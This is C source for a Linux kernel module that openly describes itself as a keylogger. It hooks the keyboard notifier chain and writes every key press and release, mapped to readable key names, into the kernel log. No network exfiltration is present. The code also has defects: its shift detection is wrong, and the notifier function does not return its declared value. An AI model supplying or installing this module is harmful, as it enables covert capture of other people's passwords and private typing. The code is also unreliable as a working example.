/* Basics: https://www.gadgetweb.de/programming/39-how-to-building-your-own-kernel-space-keylogger.html */
/* Keycodes: http://www.comptechdoc.org/os/linux/howlinuxworks/linux_hlkeycodes.html */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tanner Hoelzel");
MODULE_DESCRIPTION("A simple keylogging module");

/*
 * struct notifier_block {
 *     int (*notifier_call)(struct notifier_block *, unsigned long, void *);
 *     struct notifier_block *next;
 *     int priority;
 * };
 */

static const char* keymap[] =
	{	"ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9",
		"0", "-", "=", "BS", "TAB", "q", "w", "e", "r", "t",
		"y", "u", "i", "o", "p", "[", "]", "ENTER", "LCTRL", "a",
		"s", "d", "f", "g", "h", "j", "k", "l", ";", "'",
		"`", "LSHIFT", "\\", "z", "x", "c", "v", "b", "n", "m",
		",", ".", "/", "RSHIFT", "*", "LALT", " ", "CAPSLOCK", "F1", "F2",
		"F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLOCK",
		"HOME", "UP", "PGUP", "-", "LEFT", "5", "RTARROW", "+", "END", "DOWN",
		"PGDN", "INS", "DEL", "\0", "\0", "\0", "F11", "F12", "\0", "\0", 
		"\0", "\0", "\0", "\0", "\0", "RENTER", "RCTRL", "/", "PRTSCR", "RALT",
		"\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT",
		"DEL", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE" };

static const char* keymapShift[] =
	{	"ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(",
		")", "_", "+", "BS", "TAB", "Q", "W", "E", "R", "T",
		"Y", "U", "I", "O", "P", "{", "}", "ENTER", "CTRL", "A",
		"S", "D", "F","G", "H", "J", "K", "L", ":", "\"",
		"~", "LSHIFT", "|", "Z", "X", "C", "V", "B", "N", "M",
		"<", ">","?", "RSHIFT", "*", "\0", " ", "CAPSLOCK", "_F1_", "_F2_",
		"_F3_", "_F4_", "_F5_", "_F6_", "_F7_", "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_",
		"_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5", "_RTARROW_", "+", "_END_", "_DOWN_",
		"_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_", "\0", "\0",
		"\0", "\0", "\0", "\0", "\0", "RENTER", "RCTRL", "/", "PRTSCR", "RALT",
		"\0", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", "DOWN", "PGDN", "INSERT",
		"_DEL_", "\0", "\0", "\0", "\0", "\0", "\0", "\0", "PAUSE" };

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	struct vc_data *vc = param->vc;

	int ret = NOTIFY_OK;

	int shift = (param->value == 42)||(param->value == 54);

	if(code == KBD_KEYCODE) {
		if(shift) printk(KERN_INFO "KEYLOGGER %s %s\n", keymapShift[(param->value)-1], (param->down ? "down": "up"));
		else printk(KERN_INFO "KEYLOGGER %s %s\n", keymap[(param->value)-1], (param->down ? "down": "up"));
	}
}

static struct notifier_block nb = {
	.notifier_call = hello_notify
};

static int __init keylogger_init(void)
{
	register_keyboard_notifier(&nb);
	return 0;
}

static void __exit keylogger_cleanup(void)
{
	unregister_keyboard_notifier(&nb);
}

module_init(keylogger_init);
module_exit(keylogger_cleanup);
